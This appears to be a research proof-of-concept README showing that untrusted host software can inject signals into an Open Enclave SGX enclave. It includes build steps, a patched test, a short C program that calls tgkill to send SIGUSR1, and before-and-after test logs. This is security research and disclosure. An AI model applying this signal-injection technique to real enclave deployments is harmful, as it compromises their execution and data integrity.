# openenclave
Our attack uses the untrusted signal handling interface in openenclave to compromise the execution integrity of the enclave. Using our attack, the unstrusted software can arbitrarily trigger the signal handlers in the enclave.
build openenclave and source openenclaverc

```bash
mkdir build
cd build
cmake ..
make
make install 
source /opt/openenclave/share/openenclave/openenclaverc
```
execute the unmodified build/tests/sgx/td_state test
```bash
cd openenclave/build/tests/sgx/td_state
make test
```

We observe the following logs without our attack:

```bash
Start testing: Jan 22 20:01 CET
----------------------------------------------------------
1/1 Testing: tests/sgx/td_state
1/1 Test: tests/sgx/td_state
Command: "/home/user/sigy/openenclave/build/tests/sgx/td_state/host/td_state_host" "/home/user/sigy/openenclave/build/tests/sgx/td_state/enc/sgx_td_state_enc"
Directory: /home/user/sigy/openenclave/build/tests/sgx/td_state
"tests/sgx/td_state" start time: Jan 22 20:01 CET
Output:
----------------------------------------------------------
(tid=38838) Create a thread...
(tid=38839) thread is running...
(tid=38838) Sending interrupt to (td=0x7ffff6dd6000, tid=38839) inside the enclave...
(tid=38839) thread is interrupted...
(tid=38839) thread emulating cpuid...done
(tid=38839) thread handling div 0...done
(tid=38839) interrupt is handled...
(tid=38838) Sending interrupt to (td=0x7ffff6dd6000, tid=38839) on the host...
(tid=38839) thread is exiting...
(tid=38838) Create a thread...
(tid=38840) thread is created td=0x7ffff6dd6000
(tid=38838) Create a thread...
(tid=38841) thread is created td=0x7ffff6dd6000
=== test the td state on a thread
(tid=38839) thread is spinning on the host...
(tid=38839) thread is interrupted on the host...
=== test the handler no return
=== passed all tests (td_state)
<end of output>
Test time =   0.21 sec
----------------------------------------------------------
Test Passed.
"tests/sgx/td_state" end time: Jan 22 20:01 CET
"tests/sgx/td_state" time elapsed: 00:00:00
----------------------------------------------------------

End testing: Jan 22 20:01 CET
```

Modify the td_state test case by applying [td_state.patch](td_state.patch)
To demonstrate our attack that shows that an attacker from untrusted software can inject signals into the enclave to compromise its execution and data integrity, we modify the td_state test to not explicitly raise a signal. 
Instead, our patch replaces the signal that is raised from the enclave with a busy loop. This makes the enclave application wait for a signal. 
Using our attack, we can inject the signal from untrusted software to trigger the signal handler in the enclave. 
Note that the busy loop is a simplification in our PoC so we do not have to perfectly time the injection of the signal. 

build openenclave

```bash
mkdir build
cd build
cmake ..
make
```

run the test in openenclave/build/tests/sgx/td_state

```bash
make test
```

To inject a signal

```c
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <unistd.h>
int main(){
	int pid = 728126; //process with cmd td_state_host from ps -all
	int tid = pid + 1;
	int signalname = 10; //SIGUSR1
	syscall(SYS_tgkill, pid, tid, signalname);
}
```
we get the following output with our attack

```
Start testing: Jan 22 19:49 CET
----------------------------------------------------------
1/1 Testing: tests/sgx/td_state
1/1 Test: tests/sgx/td_state
Command: "/home/user/sigy/openenclave/build/tests/sgx/td_state/host/td_state_host" "/home/user/sigy/openenclave/build/tests/sgx/td_state/enc/sgx_td_state_enc"
Directory: /home/user/sigy/openenclave/build/tests/sgx/td_state
"tests/sgx/td_state" start time: Jan 22 19:49 CET
Output:
----------------------------------------------------------
(tid=27459) Create a thread...
(tid=27460) thread is running...
(tid=27459) Sending interrupt to (td=0x7ffff6dd4000, tid=27460) inside the enclave...
(tid=27460) thread is interrupted...
(tid=27460) thread emulating cpuid...done
(tid=27460) thread handling div 0...done
(tid=27460) interrupt is handled...
(tid=27460) thread is exiting...
=== creating encalave /home/user/sigy/openenclave/build/tests/sgx/td_state/enc/sgx_td_state_enc
=== test the td state on a thread
=== passed all tests (td_state)
<end of output>
Test time = 149.35 sec
----------------------------------------------------------
Test Passed.
"tests/sgx/td_state" end time: Jan 22 19:51 CET
"tests/sgx/td_state" time elapsed: 00:02:29
----------------------------------------------------------

End testing: Jan 22 19:51 CET
```

We have shown that we can inject interrupts from the outside.